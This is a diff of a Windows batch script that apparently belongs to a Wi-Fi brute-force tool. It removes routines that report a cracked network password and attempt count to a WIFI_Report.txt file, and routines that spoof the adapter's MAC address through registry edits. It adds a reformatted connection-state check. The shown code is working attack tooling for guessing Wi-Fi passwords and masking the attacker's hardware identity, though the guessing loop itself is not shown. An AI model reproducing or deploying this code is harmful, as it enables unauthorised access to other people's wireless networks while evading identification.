-	for /f "tokens=1-3" %%a in ( interfacelist.txt ) do (
-	
-		if !interface_choice!==%%a (
-		echo.
-		echo.
-		
-		
-		
-		
-		
-		set interface_id=!interface_%%a_id!
-		set interface_description=!interface_%%a_description!
-		set interface_mac=!interface_%%a_mac!
-		set targetwifi=No WI-FI Selected
-		
-		
-		call colorchar.exe /0f " Setting "
-		call colorchar.exe /0e "!interface_description!"
-		call colorchar.exe /f " as current interface..."
-		timeout /t 3 >nul
-		
-		)
-	
-	)
-	
-	cls
-	del interfacelist.txt
-	goto :eof	
-	
-	
-	
-	
-	
-	:show_result
-	del WIFI_Report.txt
-			cls
-			echo  [==================================================]
-			call colorchar.exe /0b "  WI-FI Brute Force Results"
-			echo.
-			echo  [==================================================]
-			call colorchar.exe /0f "  SSID: "
-			call colorchar.exe /0e "!targetwifi!"
-			echo.
-			call colorchar.exe /0f "  Password: "
-			call colorchar.exe /0a "!temppass!"
-			echo.
-			call colorchar.exe /0f "  Attempts: "
-			call colorchar.exe /09 "!attempt!"
-			echo.
-			echo  [==================================================]
-			echo.
-			echo  Attack result has written to WIFI_Report.txt
-			
-			echo [------------------------------------]>>WIFI_Report.txt
-			echo  WIFI Brute Force Results>>WIFI_Report.txt
-			echo [------------------------------------]>>WIFI_Report.txt
-			echo  SSID: !targetwifi!>>WIFI_Report.txt
-			echo  Password: !temppass!>>WIFI_Report.txt
-			echo  Attemps: !attempt!>>WIFI_Report.txt
-			echo [------------------------------------]>>WIFI_Report.txt
-			echo.
-			echo  Press any key to exit...
-			pause >nul
-			exit
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	:find_connection_state
-		set interface_state_check=false
-	
-			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
-			
-			if !interface_state_check!==true (
-				set interface_state=%%c
-				goto :skip_find_connection_state
-			)
-			
-			if "!interface_id!"=="%%c" (
-				set interface_state_check=true
-			)
-			
-			if "!interface_id!"=="%%c %%d" (
-				set interface_state_check=true
-			)
-		)
+        for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
+        
+        if !interface_state_check!==true (
+            set interface_state=%%c
+            goto :skip_find_connection_state
+        )
+        
+        if "!interface_id!"=="%%c" (
+            set interface_state_check=true
+        )
+        
+        if "!interface_id!"=="%%c %%d" (
+            set interface_state_check=true
+        )
+    )
 	:skip_find_connection_state
-		if !interface_state!==associating (
-		call colorchar.exe /0f " Associating..."
-		echo.
-		)
-		if !interface_state!==disconnecting (
-		call colorchar.exe /0c " Disconnecting..."
-		echo.
-		)
-		if !interface_state!==disconnected (
-		call colorchar.exe /04 " Disconnected."
-		echo.
-		)
-		if !interface_state!==authenticating (
-		call colorchar.exe /0a " Authenticating..."
-		echo.
-		)
-		if !interface_state!==connecting (
-		call colorchar.exe /02 " Connecting..."
-		echo.
-		)
-		if !interface_state!==connected (
-		call colorchar.exe /02 " CONNECTED."
-		echo.
-		timeout /t 2 /nobreak>nul
-		)
-			
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	:set_states
-		set interface_%1_state=%2
-	goto :eof
-	
-	
-	
-	
-	:set_states_2
-			if "!interface_number!"=="1" (
-				set interface_state=!interface_1_state!
-			)else (
-				echo !interface_id!>interface_id.txt
-
-					
-					for /l %%a in ( 1, 1, 100) do (
-
-			
-						if "!interface_id!" equ "!interface_%%a_id!" (
-							set interface_state=!interface_%%a_state!
-						)
-						
-					)	
-					
-					
-					
-				del interface_id.txt
-			)
-	goto :eof
-	
-	:calc_percentage
-	set /a pass_percentage = (%~1*100)/%~2
-	
-	goto :eof
-
-
-
-
-
-	:mac_randomizer
-	set allowed_mac_char_list_obliged=EA26
-	set allowed_mac_char_list=123456789ABCDEF
-	
-	set set_mac=
-	
-	for /l %%a in ( 1,1,12) do (
-	
-		if %%a==2 (
-			call :index_for_mac_calc_2
-			call :set_mac_char_2 !index_for_mac!
-		)else (	
-			call :index_for_mac_calc_1
-			call :set_mac_char_1 !index_for_mac!	
-		)
-	) 
-	goto :eof
-	:index_for_mac_calc_1
-		set /a index_for_mac=(!random!) %% 15
-	goto :eof
-	:set_mac_char_1
-		set set_mac=!set_mac!!allowed_mac_char_list:~%1,1!
-	goto :eof
-	:index_for_mac_calc_2
-		set /a index_for_mac=(!random!) %% 4
-	goto :eof
-	:set_mac_char_2
-		set set_mac=!set_mac!!allowed_mac_char_list_obliged:~%1,1!
-	goto :eof
-
-
-
-
-
-	:interface_mac_check 
-		for /f "tokens=1-4" %%a in ( 'wmic nic get name^,macaddress ^| findstr /L "!interface_description!"') do (
-			if "!interface_description!"=="%%b %%c" (
-			set interface_mac=%%a
-			goto :eof
-			)
-			
-		)
-	goto :eof
-
-
-
-
-	:interface_admin_state_check
-	for /f "tokens=1-5" %%a in ( ' netsh interface show interface name^="!interface_id!" ' ) do (
-		if %%a==Administrative (
-			set interface_admin_state=%%c
-			goto :eof
-		)
-	)
-	goto :eof
-
-
-
-
-
-
-	:interface_registry_check
-
-	for /f "tokens=* skip=7" %%a in ( 'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}' ) do (
-	
-	
-			set current_registry_key=%%a
-			set current_registry_interface_description=
-			set interface_mac_changed=false
-			
-			for /f "tokens=1-10" %%b in ( 'REG QUERY !current_registry_key!' ) do (
-			
-
-				if %%b==DriverDesc (
-					set current_registry_interface_description=%%d %%e
-			
-				)
-				
-				if %%b==NetworkAddress (
-					set interface_mac_changed=true
-			
-				)
-				
-			)	
-				if "!interface_description!" equ "!current_registry_interface_description!" (
-					set interface_registry_location=!current_registry_key!
-					goto :eof
-				)
-
-	)
-	goto :eof
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	:interface_management
-	call :interface_admin_state_check
-	call :interface_mac_check
-	call :interface_registry_check
-	:skip_interface_management_check
-	cls
-	echo.
-	call colorchar.exe /0b "  Interface Management"
-	echo.                                                             
-	echo.
-	echo.
-	call colorchar.exe /0b "   Description: "
-	call colorchar.exe /0e "!interface_description!
-	echo.
-	call colorchar.exe /0b "   Registry Location: "
-	call colorchar.exe /0f "!interface_registry_location!"
-	echo.
-	call colorchar.exe /0b "   MAC Address: "
-	call colorchar.exe /08 "!interface_mac!"
-	echo.
-	call colorchar.exe /0b "   MAC Address Status: "
-	if "!interface_description!"=="Not Selected" (
-		call colorchar.exe /0f "Not Selected"
-		goto :skip_mac_address_status_show
-	)
-	if "!interface_mac_changed!"=="true" (
-		call colorchar.exe /0c "Changed"
-	)
-	if !interface_mac_changed!==false (
-		call colorchar.exe /0a "Original Static Address"
-	)
-	:skip_mac_address_status_show
-	echo.
-	call colorchar.exe /0b "   ID: "
-	call colorchar.exe /0f "!interface_id!"
-	echo.
-	call colorchar.exe /0b "   Interface Status: "
-	if "!interface_description!"=="Not Selected" (
-		call colorchar.exe /0f "Not Selected"
-	)
-	if !interface_admin_state!==Enabled (
-		call colorchar.exe /0a "Enabled"
-	)
-	if !interface_admin_state!==Disabled (
-		call colorchar.exe /0c "Disabled"
-	)
-	echo.
-	echo.
-	echo.
-	echo  [--------------------------------------------------------------------------------------------------------------------------]
-	call colorchar.exe /0b "    Interface Management Commands"
-	echo.
-	echo.  
-	echo    - select interface              : Choose another interface
-	echo    - macspoof                      : Perform MAC Spoofing (Administrator Privileges)
-	echo    - exit                          : Exits Interface Management
-	echo.
-	echo  [--------------------------------------------------------------------------------------------------------------------------]
-	echo.
-	call colorbox.exe /0f 1 3 125 10
-	
-	
-	call :userinput
-	set /p interfacemanagementchoice=
-	
-	if !interfacemanagementchoice!==exit (
-	set interfacemanagementchoice=
-	cls
-	goto :main
-	)
-	
-	if "!interfacemanagementchoice!"=="select interface" (
-	call :interface_detection
-	call :interface_selection
-	cls
-	set interfacemanagementchoice=
-	goto :interface_management
-	
-	)
-	
-	
-	if "!interfacemanagementchoice!"=="macspoof" (
-		if "!interface_description!"=="Not Selected" (
-			echo.
-			call colorchar.exe /0c " An Interface must be selected for MAC Spoofing..."
-			timeout /t 3 >nul
-			set interfacemanagementchoice=
-			cls
-			goto :skip_interface_management_check
-		
-		)
-		
-		
-		call :mac_spoofing
-		set interfacemanagementchoice=
-		cls
-		goto :skip_interface_management_check
-	
-	)
-	
-	
-	call colorchar.exe /0c " Invalid input"
-	echo.
-	timeout /t 2 >nul
-	cls
-	set interfacemanagementchoice=
-	goto :skip_interface_management_check
-
-
-
-
-
-
-
-
-
-
-	:mac_spoofing
-	
-	if "!privilege_level!"=="local" (
-		echo.
-		call colorchar.exe /0c " Administrator Privileges are required to use this feature..."
-		timeout /t 3 >nul
-		cls
-		set interfacemanagementchoice=
-		goto :skip_interface_management_check
-	)
-	cls
-	echo.
-	call colorchar.exe /0b " MAC Spoofing"
-	echo.
-	echo.
-	echo  [--------------------------------------------------------------------------------------------------------------------------]
-	call colorchar.exe /0b "   Interface: "
-	call colorchar.exe /0e "!interface_description!"
-	echo.
-	call colorchar.exe /0b "   MAC: "
-	call colorchar.exe /08 "!interface_mac!"
-	echo.
-	echo.
-	echo  [--------------------------------------------------------------------------------------------------------------------------]
-	call colorchar.exe /0b "    MAC Spoofing Commands"
-	echo.
-	echo.
-	echo    - revert            : Revert MAC address to original
-	echo    - randomize mac     : Randomize MAC Address
-	echo    - exit              : Exit MAC Spoofing screen
-	echo.
-	echo  [--------------------------------------------------------------------------------------------------------------------------]
-	echo.
-	call colorbox.exe /0f 1 3 125 6
-	
-	call :userinput
-	set /p macspoofingchoice=
-	
-	
-	
-	if "!macspoofingchoice!"=="exit" (
-		set macspoofingchoice=
-		cls
-		goto :skip_interface_management_check
-	
-	)
-	
-	
-	
-	if "!macspoofingchoice!"=="revert" (
-		
-		if !interface_mac_changed!==false (
-		echo.
-		call colorchar.exe /0c " !interface_description! is already has Original Static MAC..."
-		timeout /t 3 >nul
-		set macspoofingchoice=
-		cls
-		goto :mac_spoofing
-		)
-		echo.
-		echo  Disabling "!interface_description!"...
-		netsh interface set interface name="!interface_id!" admin=disabled >nul
-		echo  Reverting MAC Address...
-		reg delete !interface_registry_location! /v NetworkAddress /f >nul
-		echo  Enabling "!interface_description!"...
-		netsh interface set interface name="!interface_id!" admin=enabled >nul
-		call colorchar.exe /0a " Completed."
-		timeout /t 3 >nul
-		set macspoofingchoice=
-		cls
-		goto :interface_management
-	
-	
-	
-	)
-	
-	
-	
-	
-	
-	
-	if "!macspoofingchoice!"=="randomize mac" (
-		echo.
-		echo  Generating a random MAC Address...
-		call :mac_randomizer
-		echo.
-		call colorchar.exe /0f " Generated: "
-		call colorchar.exe /0a "!set_mac!"
-		echo.
-		echo  Disabling "!interface_description!"...
-		netsh interface set interface name="!interface_id!" admin=disabled >nul	
-		echo  Applying new MAC Address...
-		reg add !interface_registry_location! /v NetworkAddress /t REG_SZ /d "!set_mac!"
-		echo  Enabling "!interface_description!"...
-		netsh interface set interface name="!interface_id!" admin=enabled >nul
-		call colorchar.exe /0a " Completed."
-		timeout /t 3 >nul
-		set macspoofingchoice=
-		cls
-		goto :interface_management
-	)
-	
-
-	
-	echo.
-	call colorchar.exe /0c " Invalid input"
-	echo.
-	timeout /t 2 >nul
-	set macspoofingchoice=
-	cls
-	goto :mac_spoofing
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	
-	
+    if !interface_state!==associating (
+        call :color_echo . yellow "Associating..."
+        echo.
+    )
+    if !interface_state!==disconnecting (
+        call :color_echo . red "Disconnecting..."
+        echo.
+    )
+    if !interface_state!==disconnected (
+        call :color_echo . red "Disconnected."
+        echo.
+    )
+    if !interface_state!==authenticating (
+        call :color_echo . blue "Authenticating..."
+        echo.
+    )
+    if !interface_state!==connecting (
+        call :color_echo . yellow "Connecting..."
+        echo.
+    )
+    if !interface_state!==connected (
+        call :color_echo . green "Connected."
+        echo.
+        timeout /t 2 /nobreak>nul
+    )
+
+
+
+
+goto :eof
